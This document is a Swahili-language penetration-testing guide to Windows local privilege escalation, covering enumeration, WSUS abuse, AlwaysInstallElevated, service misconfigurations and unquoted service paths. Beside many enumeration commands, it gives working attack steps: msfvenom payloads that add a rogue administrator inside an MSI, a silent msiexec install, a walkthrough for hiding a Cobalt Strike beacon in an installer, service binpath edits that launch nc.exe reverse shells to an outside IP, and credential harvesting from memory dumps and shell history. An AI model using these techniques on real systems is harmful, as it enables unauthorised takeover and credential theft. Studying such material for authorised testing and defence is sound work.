# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Ikiwa hujui Windows Access Tokens ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa taarifa zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows ni nini, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Kuna vitu mbalimbali katika Windows vinavyoweza **kukuzuia kutoka kuorodhesha mfumo**, kuendesha executables au hata **kubaini shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **kuorodhesha** mifumo yote ya **defenses** **mechanisms** kabla ya kuanza uorodheshaji wa privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

Angalia ikiwa toleo la Windows lina udhaifu unaojulikana (angalia pia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Tovuti hii ([https://msrc.microsoft.com/update-guide/vulnerability](https://msrc.microsoft.com/update-guide/vulnerability)) inafaa kwa kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, ikionesha **eneo kubwa la mashambulizi** ambalo mazingira ya Windows yanatoa.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojengewa ndani)_

**Kwenye kompyuta kwa taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info iliyohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuiwezesha katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline za PowerShell yanarekodiwa, ikijumuisha amri zilizotekelezwa, kuitwa kwa amri, na sehemu za script. Hata hivyo, maelezo kamili ya utekelezaji na matokeo yanaweza yasikamatwe.

Ili kuziwezesha, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwenye logi za PowersShell, unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na yaliyomo yote ya utekelezaji wa script inarekodiwa, ikihakikisha kwamba kila block of code inadokumentiwa wakati inavyotekelezwa. Mchakato huu unahifadhi audit trail kamili ya kila shughuli, muhimu kwa forensics na kwa uchambuzi wa malicious behavior. Kwa kudokumentisha shughuli zote wakati wa utekelezaji, hutoa ufahamu wa kina kuhusu mchakato.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya kurekodi kwa Script Block yanaweza kupatikana ndani ya Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kuchukua udhibiti wa mfumo ikiwa masasisho hayataombwa kwa kutumia http**S** bali http.

Unaanza kwa kuangalia ikiwa mtandao unatumia masasisho ya WSUS yasiyo-SSL kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa utapokea jibu kama mmoja wa haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **it is exploitable.** Ikiwa registry ya mwisho ni sawa na `0`, basi entry ya WSUS itapuuzwa.

Ili kuchukua faida ya vulnerabilities hizi unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni MiTM weaponized exploits scripts za kuingiza updates 'bandia' katika trafiki ya WSUS isiyo-SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> Ikiwa tuna uwezo wa kubadilisha local user proxy yetu, na Windows Updates inatumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer’s, basi tunaweza kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) kwa ndani ili kukamata trafiki yetu wenyewe na kuendesha code kama elevated user kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa WSUS service inatumia settings za current user, itatumia pia certificate store yake. Ikiwa tutaunda self-signed certificate kwa WSUS hostname na kuongeza certificate hii kwenye current user’s certificate store, tutaweza kukamata trafiki ya WSUS ya HTTP na HTTPS. WSUS haina mechanisms kama HSTS kutekeleza validation ya aina ya trust-on-first-use kwa certificate. Ikiwa certificate iliyowasilishwa inatumika (trusted) na mtumiaji na ina hostname sahihi, itakubaliwa na service.

Unaweza ku-exploit vulnerability hii kwa kutumia tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapopatikana).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa enterprise huonyesha localhost IPC surface na privileged update channel. Ikiwa enrollment inaweza kusukumwa kwenda kwa attacker server na updater inaamini rogue root CA au weak signer checks, local user anaweza kuwasilisha MSI mbaya ambayo SYSTEM service itainstall. Tazama technique ya jumla (based on the Netskope stAgentSvc chain – CVE-2025-0309) hapa:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya ni pamoja na mazingira ambapo **LDAP signing is not enforced,** watumiaji wana haki za kujipa wenyewe zinazowawezesha kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda computers ndani ya domain. Ni muhimu kutambua kuwa hizi **requirements** zinakidhiwa kwa kutumia **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** hizi 2 rejista ziko **enabled** (thamani ni **0x1**), basi watumiaji wa hadhi yoyote wanaweza **install** (execute) `*.msi` files kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kuotomatisha mbinu hii kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up kuunda ndani ya sarakasi ya sasa binary ya MSI ya Windows ili escalate privileges. Skripti hii inaandika installer ya MSI iliyotayarishwa awali (precompiled) ambayo itauliza kuongeza mtumiaji/kikundi (kwa hivyo utahitaji GIU access):
```
Write-UserAddMSI
```
Endesha tu binary iliyotengenezwa ili kuinua vibali.

### MSI Wrapper

Soma mafunzo haya kujifunza jinsi ya kuunda MSI wrapper ukitumia zana hizi. Kumbuka unaweza ku-wrap faili "**.bat**" ikiwa unataka **tu** **kuendesha** **mistari ya amri**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** na Cobalt Strike au Metasploit **new Windows EXE TCP payload** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Mpa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa mahali, chagua **place solution and project in the same directory**, na bonyeza **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bonyeza **Add** na chagua Beacon payload uliyotengeneza. Kisha bonyeza **Finish**.
- Chagua mradi **AlwaysPrivesc** katika **Solution Explorer** na ndani ya **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna sifa nyingine unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya kulia mradi kisha chagua **View > Custom Actions**.
- Bofya kulia **Install** na chagua **Add Custom Action**.
- Bonyeza mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na bonyeza **OK**. Hii itahakikisha kwamba beacon payload itaendeshwa mara tu msakinishaji utakapotekelezwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwisho, **jenga**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonekana, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hatari `.msi` kwa **usuli:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kuchochea udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua nini kinachorekodiwa (**kurekodiwa**), kwa hivyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua wapi logs zinatumwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za local Administrator**, ikihakikisha kuwa kila nywila ni **ya kipekee, iliyopangwa kwa bahati nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kupatikana tu na watumiaji ambao wamepewa vibali vya kutosha kupitia ACLs, kuruhusu wao kuona nywila za local admin iwapo wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa inafanya kazi, **plain-text passwords zinahifadhiwa katika LSASS** (Local Security Authority Subsystem Service).\
[**Taarifa zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia na **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyotegemewa **kusoma kumbukumbu yake** au kuingiza msimbo, ikiboresha usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Lengo lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama mashambulizi ya pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Uthibitisho Vilivyohifadhiwa

**Uthibitisho za Domain** zinathibitishwa na **Mamlaka ya Usalama ya Ndani** (LSA) na zinatumiwa na vipengele vya mfumo wa uendeshaji. Wakati data za kuingia za mtumiaji zinathibitishwa na kifurushi cha usalama kilichojiandikisha, mara nyingi uthibitisho za Domain kwa mtumiaji huundwa.\
[**Maelezo zaidi kuhusu Uthibitisho Vilivyohifadhiwa hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia kama kuna vikundi ambavyo wewe ni mwanachama wake vinavyo ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vyenye ruhusa za juu

Ikiwa wewe **uko katika kundi fulani lenye ruhusa za juu, unaweza kuwa na uwezo wa kuongeza ruhusa**. Jifunze kuhusu vikundi vyenye ruhusa za juu na jinsi ya kuvitumia vibaya ili kuongeza ruhusa hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu token ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa lifuatalo ili **ujifunze kuhusu tokens zinazovutia** na jinsi ya kuvitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nywila
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Inayoendeshwa

### Ruhusa za Faili na Mafolda

Kwanza kabisa, unaporodhesha michakato **angalia kama kuna nywila ndani ya mstari wa amri wa mchakato**.\
Angalia ikiwa unaweza **kuandika juu ya binary fulani inayoendeshwa** au kama una ruhusa ya kuandika kwenye folda ya binary ili kutumia [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za binaries za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kuangalia ruhusa za folda za process binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda memory dump ya mchakato unaoendesha kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials in clear text in memory**; jaribu kufanya dump ya memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazotekelezwa kama SYSTEM zinaweza kumruhusu mtumiaji kuanzisha CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Services

Service Triggers zinaweza kuruhusu Windows kuanza service wakati masharti fulani yanapotokea (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, n.k.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanza huduma zenye ruhusa za juu kwa kuwasha triggers zao. Angalia mbinu za kuorodhesha na kuanzisha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia ikiwa "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa unapata hitilafu hii (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_Huduma haiwezi kuanzishwa, ama kwa sababu imezimwa au kwa sababu haina vifaa vilivyowezeshwa vinavyohusishwa nayo._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Chukua kwa kuzingatia kwamba huduma upnphost inategemea SSDPSRV kufanya kazi (kwa XP SP1)**

**Njia mbadala nyingine** ya tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika tukio ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye huduma, inawezekana kubadilisha binary inayotekelezwa ya huduma. Ili kubadilisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Kuongezeka kwa ruhusa kunaweza kufanyika kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Inaruhusu usanidi upya wa ruhusa, ikisababisha uwezo wa kubadilisha usanidi wa service.
- **WRITE_OWNER**: Inaruhusu kupata umiliki na usanidi upya wa ruhusa.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha usanidi wa service.

Kwa kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binaries za service

**Angalia kama unaweza kubadilisha binary inayotekelezwa na service** au kama una **uruhusa za kuandika kwenye folda** ambapo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (not in system32) na ukague ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha rejista ya huduma

Unapaswa kuangalia kama unaweza kubadilisha rejista yoyote ya huduma.\
Unaweza **kuangalia** **ruksa zako** kwenye rejista ya **huduma** kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuangaliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Ruhusa za Services registry AppendData/AddSubdirectory

Ikiwa una ruhusa hii juu ya rejista, hii inamaanisha **unaweza kuunda rejista ndogo kutoka kwa hii**. Katika kesi ya Windows services hii ni **ya kutosha kutekeleza kodhi yoyote:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Njia za Service zisizo na nukuu

Ikiwa path ya executable haiko ndani ya nukuu, Windows itajaribu kutekeleza kila sehemu kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za huduma zisizokuwa zimewekwa ndani ya nukuu, isipokuwa zile za huduma za Windows zilizojengwa ndani:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza detect na exploit** hii vulnerability kwa metasploit: `exploit/windows/local/trusted_service_path` Unaweza kuunda kwa mkono service binary kwa metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejesho

Windows inaruhusu watumiaji kubainisha hatua zitakazochukuliwa ikiwa huduma itashindikana. Kipengele hiki kinaweza kusanidiwa kuonyesha binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kutokea. Taarifa zaidi zinaweza kupatikana katika the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu Zilizosakinishwa

Kagua **idhinishaji za binaries** (labda unaweza kuibadilisha mojawapo na escalate privileges) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Kagua kama unaweza kubadilisha faili ya usanidi ili kusoma faili maalum au kama unaweza kubadilisha binary itakayotekelezwa na akaunti ya Administrator (schedtasks).

Njia moja ya kupata ruhusa dhaifu za folda/faili kwenye mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
